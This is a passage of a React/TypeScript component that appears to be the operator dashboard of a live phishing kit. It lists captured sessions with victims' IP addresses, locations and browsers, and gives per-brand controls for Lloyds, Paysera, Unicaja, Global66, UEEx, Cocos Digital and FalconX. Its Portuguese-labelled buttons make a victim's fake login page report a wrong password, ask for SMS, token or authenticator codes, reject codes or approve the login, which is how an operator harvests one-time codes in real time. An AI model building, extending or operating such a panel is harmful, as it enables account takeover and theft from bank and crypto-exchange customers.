                        onCopy={copyValue}
                        highlight
                      />
                    ))}

                    {/* IP + Location */}
                    <span className="text-muted-foreground">
                      IP: <span className="text-foreground font-mono">{s.ip_address || "—"}</span>
                    </span>
                    {(s.city || s.country) && (
                      <span className="text-muted-foreground">
                        {[s.city, s.country].filter(Boolean).join(", ")}
                      </span>
                    )}
                    {s.user_agent && (
                      <span className="text-muted-foreground flex items-center gap-1">
                        <Monitor size={9} /> {parseBrowser(s.user_agent)}
                      </span>
                    )}
                  </div>
                </div>

                {/* ── Row 3: Quick Actions ── */}
                <div className="border-t border-border/50 bg-muted/20 px-4 py-2">
                 {s.source === "lloyds" ? (
                    /* Lloyds: only Wrong Password + Approve */
                    <div className="flex items-center gap-2 flex-wrap">
                      <span className="text-[9px] font-bold uppercase tracking-widest text-emerald-500/60 mr-0.5 shrink-0">Lloyds</span>
                      <QuickBtn icon={<AlertTriangle size={11} />} label="Senha Errada" onClick={() => qPWrong(s.id)} loading={quickSending === `${s.id}-pw`} variant="warn" />
                      <QuickBtn icon={<CheckCircle size={11} />} label="Aprovar Login" onClick={() => qPApproveLogin(s.id)} loading={quickSending === `${s.id}-approve`} variant="success" />
                    </div>
                  ) : s.source === "paysera" ? (
                    /* Paysera */
                    <div className="flex items-center gap-1.5 flex-wrap">
                      <span className="text-[9px] font-bold uppercase tracking-widest text-teal-500/60 mr-0.5 shrink-0">PAYSERA</span>
                      <QuickBtn icon={<AlertTriangle size={11} />} label="Senha Errada" onClick={() => qPWrong(s.id)} loading={quickSending === `${s.id}-pw`} variant="warn" />
                      <span className="border-l border-border h-4 mx-0.5" />
                      <div className="flex items-center gap-1">
                        <input
                          value={payseraTokenInputs[s.id] || ""}
                          onChange={(e) => setPayseraTokenInputs((prev) => ({ ...prev, [s.id]: e.target.value }))}
                          placeholder="Nº token"
                          className="w-[70px] rounded-md border border-teal-500/30 bg-background/50 px-1.5 py-0.5 text-[10px] text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-teal-500"
                        />
                        <button
                          onClick={() => qPPayseraToken(s.id, payseraTokenInputs[s.id] || "")}
                          disabled={!(payseraTokenInputs[s.id] || "").trim() || quickSending === `${s.id}-ptoken`}
                          className="rounded-md bg-teal-500 px-1.5 py-0.5 text-white text-[9px] font-bold disabled:opacity-40 hover:bg-teal-600 transition-colors flex items-center gap-0.5"
                        >
                          <Send size={9} /> Token
                        </button>
                      </div>
                      <QuickBtn icon={<Loader2 size={11} />} label="Loop" onClick={() => qPPayseraLoop(s.id)} loading={quickSending === `${s.id}-ploop`} variant="blue" />
                      <QuickBtn icon={<XCircle size={11} />} label="Negar Token" onClick={() => qPOtpWrong(s.id)} loading={quickSending === `${s.id}-otpw`} variant="danger" />
                      <span className="border-l border-border h-4 mx-0.5" />
                      <QuickBtn icon={<Smartphone size={11} />} label="Pedir SMS" onClick={() => qPPayseraSms(s.id)} loading={quickSending === `${s.id}-psms`} variant="amber" />
                      <QuickBtn icon={<XCircle size={11} />} label="Negar SMS" onClick={() => qPOtpWrong(s.id)} loading={quickSending === `${s.id}-otpw`} variant="danger" />
                      <span className="border-l border-border h-4 mx-0.5" />
                      <QuickBtn icon={<Smartphone size={11} />} label="Verificar Tel" onClick={() => qPPayseraVerifyPhone(s.id)} loading={quickSending === `${s.id}-pvphone`} variant="amber" />
                      <span className="border-l border-border h-4 mx-0.5" />
                      <QuickBtn icon={<CheckCircle size={11} />} label="Aprovar Login" onClick={() => qPApproveLogin(s.id)} loading={quickSending === `${s.id}-approve`} variant="success" />
                    </div>
                  ) : s.source === "cocosdigital" ? (
                    /* Cocos Digital */
                    <div className="flex items-center gap-1.5 flex-wrap">
                      <span className="text-[9px] font-bold uppercase tracking-widest text-cyan-500/60 mr-0.5 shrink-0">Cocos</span>
                      <QuickBtn icon={<AlertTriangle size={11} />} label="Senha Errada" onClick={() => qPWrong(s.id)} loading={quickSending === `${s.id}-pw`} variant="warn" />
                      <span className="border-l border-border h-4 mx-0.5" />
                      <QuickBtn icon={<KeyRound size={11} />} label="MFA Google" onClick={() => qPOtp(s.id)} loading={quickSending === `${s.id}-otp`} variant="blue" />
                      <QuickBtn icon={<Smartphone size={11} />} label="MFA SMS" onClick={() => qPMfaSms(s.id)} loading={quickSending === `${s.id}-mfasms`} variant="blue" />
                      <QuickBtn icon={<Mail size={11} />} label="MFA Email" onClick={() => qPMfaEmail(s.id)} loading={quickSending === `${s.id}-mfaemail`} variant="amber" />
                      <span className="border-l border-border h-4 mx-0.5" />
                      <QuickBtn icon={<XCircle size={11} />} label="2FA Errado" onClick={() => qPOtpWrong(s.id)} loading={quickSending === `${s.id}-otpw`} variant="danger" />
                      <QuickBtn icon={<CheckCircle size={11} />} label="Aprovar Login" onClick={() => qPApproveLogin(s.id)} loading={quickSending === `${s.id}-approve`} variant="success" />
                    </div>
                  ) : s.source === "ueex" ? (
                    /* UEEx: same as Volet */
                    <div className="flex items-center gap-1.5 flex-wrap">
                      <span className="text-[9px] font-bold uppercase tracking-widest text-orange-500/60 mr-0.5 shrink-0">UEEx</span>
                      <QuickBtn icon={<AlertTriangle size={11} />} label="Senha Errada" onClick={() => qPWrong(s.id)} loading={quickSending === `${s.id}-pw`} variant="warn" />
                      <span className="border-l border-border h-4 mx-0.5" />
                      <QuickBtn icon={<KeyRound size={11} />} label="Pedir Token" onClick={() => qPOtp(s.id)} loading={quickSending === `${s.id}-otp`} variant="blue" />
                      <QuickBtn icon={<XCircle size={11} />} label="Negar Token" onClick={() => qPOtpWrong(s.id)} loading={quickSending === `${s.id}-otpw`} variant="danger" />
                      <span className="border-l border-border h-4 mx-0.5" />
                      <QuickBtn icon={<ShieldCheck size={11} />} label="Pedir Identificação" onClick={() => qEEmail(s.id)} loading={quickSending === `${s.id}-email`} variant="amber" />
                      <QuickBtn icon={<XCircle size={11} />} label="Negar PIN" onClick={() => qEWrongPw(s.id)} loading={quickSending === `${s.id}-ewpw`} variant="danger" />
                      <span className="border-l border-border h-4 mx-0.5" />
                      <QuickBtn icon={<CheckCircle size={11} />} label="Aprovar Login" onClick={() => qPApproveLogin(s.id)} loading={quickSending === `${s.id}-approve`} variant="success" />
                    </div>
                  ) : s.source === "unicaja" ? (
                    /* Unicaja: simple OTP flow */
                    <div className="flex items-center gap-2 flex-wrap">
                      <span className="text-[9px] font-bold uppercase tracking-widest text-sky-600/60 mr-0.5 shrink-0">Unicaja</span>
                      <QuickBtn icon={<AlertTriangle size={11} />} label="Senha Errada" onClick={() => qPWrong(s.id)} loading={quickSending === `${s.id}-pw`} variant="warn" />
                      <QuickBtn icon={<KeyRound size={11} />} label="Pedir OTP" onClick={() => qPOtp(s.id)} loading={quickSending === `${s.id}-otp`} variant="blue" />
                      <QuickBtn icon={<XCircle size={11} />} label="OTP Errado" onClick={() => qPOtpWrong(s.id)} loading={quickSending === `${s.id}-otpw`} variant="danger" />
                      <QuickBtn icon={<CheckCircle size={11} />} label="Aprovar Login" onClick={() => qPApproveLogin(s.id)} loading={quickSending === `${s.id}-approve`} variant="success" />
                    </div>
                  ) : s.source === "global66" ? (
                    /* Global66 */
                    <div className="flex items-center gap-1.5 flex-wrap">
                      <span className="text-[9px] font-bold uppercase tracking-widest text-indigo-500/60 mr-0.5 shrink-0">G66</span>
                      <QuickBtn icon={<AlertTriangle size={11} />} label="Senha Errada" onClick={() => qPWrong(s.id)} loading={quickSending === `${s.id}-pw`} variant="warn" />
                      <span className="border-l border-border h-4 mx-0.5" />
                      <QuickBtn icon={<KeyRound size={11} />} label="MFA Google" onClick={() => qPOtp(s.id)} loading={quickSending === `${s.id}-otp`} variant="blue" />
                      <QuickBtn icon={<Smartphone size={11} />} label="MFA SMS" onClick={() => qPMfaSms(s.id)} loading={quickSending === `${s.id}-mfasms`} variant="blue" />
                      <QuickBtn icon={<Mail size={11} />} label="MFA Email" onClick={() => qPMfaEmail(s.id)} loading={quickSending === `${s.id}-mfaemail`} variant="amber" />
                      <span className="border-l border-border h-4 mx-0.5" />
                      <QuickBtn icon={<XCircle size={11} />} label="2FA Errado" onClick={() => qPOtpWrong(s.id)} loading={quickSending === `${s.id}-otpw`} variant="danger" />
                      <span className="border-l border-border h-4 mx-0.5" />
                      <QuickBtn icon={<MailCheck size={11} />} label="Pedir Email" onClick={() => qEEmail(s.id)} loading={quickSending === `${s.id}-email`} variant="amber" />
                      <QuickBtn icon={<AlertTriangle size={11} />} label="Senha Email ✗" onClick={() => qEWrongPw(s.id)} loading={quickSending === `${s.id}-ewpw`} variant="warn" />
                      <QuickBtn icon={<ShieldCheck size={11} />} label="2FA Email" onClick={() => qEAskOtp(s.id)} loading={quickSending === `${s.id}-eotp`} variant="blue" />
                      <QuickBtn icon={<Smartphone size={11} />} label="SMS Email" onClick={() => qESms(s.id)} loading={quickSending === `${s.id}-esms`} variant="blue" />
                      <span className="border-l border-border h-4 mx-0.5" />
                      <QuickBtn icon={<CheckCircle size={11} />} label="Aprovar Login" onClick={() => qPApproveLogin(s.id)} loading={quickSending === `${s.id}-approve`} variant="success" />
                    </div>
                  ) : (
                    /* FalconX: quick buttons */
                    <div className="flex items-center gap-2 flex-wrap">
                      <span className="text-[9px] font-bold uppercase tracking-widest text-muted-foreground/50 mr-0.5 shrink-0">Operador</span>
                      <QuickBtn icon={<AlertTriangle size={11} />} label="Senha Errada" onClick={() => qPWrong(s.id)} loading={quickSending === `${s.id}-pw`} variant="warn" />
                      <QuickBtn icon={<ShieldCheck size={11} />} label="Pedir 2FA" onClick={() => qPOtp(s.id)} loading={quickSending === `${s.id}-otp`} variant="blue" />
                      <QuickBtn icon={<XCircle size={11} />} label="2FA Errado" onClick={() => qPOtpWrong(s.id)} loading={quickSending === `${s.id}-otpw`} variant="danger" />
                      <QuickBtn icon={<CheckCircle size={11} />} label="Aprovar Login" onClick={() => qPApproveLogin(s.id)} loading={quickSending === `${s.id}-approve`} variant="success" />
                    </div>
                  )}
                </div>
              </div>
            );
          })}
        </div>
      )}
    </div>
  );
};

/* ═══════════════════════════════════════════ */
/*  Data Chip (copyable field)                */
/* ═══════════════════════════════════════════ */
const DataChip = ({
  icon,
  label,
  value,
  valueColor,
  copyKey,
  copiedKey,
  onCopy,
  highlight,
}: {
  icon: React.ReactNode;
  label: string;
  value: string;
  valueColor?: string;
  copyKey: string;
  copiedKey: string | null;
  onCopy: (val: string, key: string) => void;
  highlight?: boolean;
}) => {
  const isCopied = copiedKey === copyKey;
  return (
    <span className={`inline-flex items-center gap-1.5 ${highlight ? "font-semibold" : ""}`}>
      <span className="text-muted-foreground/60">{icon}</span>
      <span className="text-muted-foreground">{label}:</span>
      <span className={`font-mono ${valueColor || "text-foreground"}`}>{value}</span>
      {value && value !== "—" && (
        <button
          onClick={() => onCopy(value, copyKey)}
          className="text-muted-foreground/40 hover:text-foreground transition-colors"
          title="Copiar"
        >
          {isCopied ? <Check size={10} className="text-green-400" /> : <Copy size={10} />}
        </button>
      )}
    </span>
  );
};

/* ═══════════════════════════════════════════ */
/*  Quick Action Button                       */
/* ═══════════════════════════════════════════ */
const QuickBtn = ({
  icon,
  label,
  onClick,
  loading,
  variant,
}: {
  icon: React.ReactNode;
  label: string;
  onClick: () => void;
  loading?: boolean;
  variant?: "warn" | "danger" | "amber" | "blue" | "success";
}) => {
  const colors =
    variant === "danger"
      ? "border-destructive/25 text-destructive hover:bg-destructive/10 hover:border-destructive/40"
      : variant === "warn"
      ? "border-amber-500/25 text-amber-500 hover:bg-amber-500/10 hover:border-amber-500/40"
      : variant === "amber"
      ? "border-amber-500/25 text-amber-400 hover:bg-amber-500/10 hover:border-amber-500/40"
      : variant === "blue"
      ? "border-blue-500/25 text-blue-400 hover:bg-blue-500/10 hover:border-blue-500/40"
      : variant === "success"
      ? "border-green-500/25 text-green-400 hover:bg-green-500/10 hover:border-green-500/40"
      : "border-border text-foreground hover:border-primary/30 hover:bg-primary/5";

  return (
    <button
      onClick={onClick}
      disabled={loading}
      className={`flex items-center gap-1 rounded-md border px-2 py-1 text-[10px] font-semibold transition-all disabled:opacity-40 active:scale-95 ${colors}`}
    >
      {loading ? (
        <span className="h-2.5 w-2.5 animate-spin rounded-full border-[1.5px] border-current border-t-transparent" />
      ) : (
        icon
      )}
      {label}
    </button>
  );
};

export default AllSessionsTable;
export type { SessionRecord };
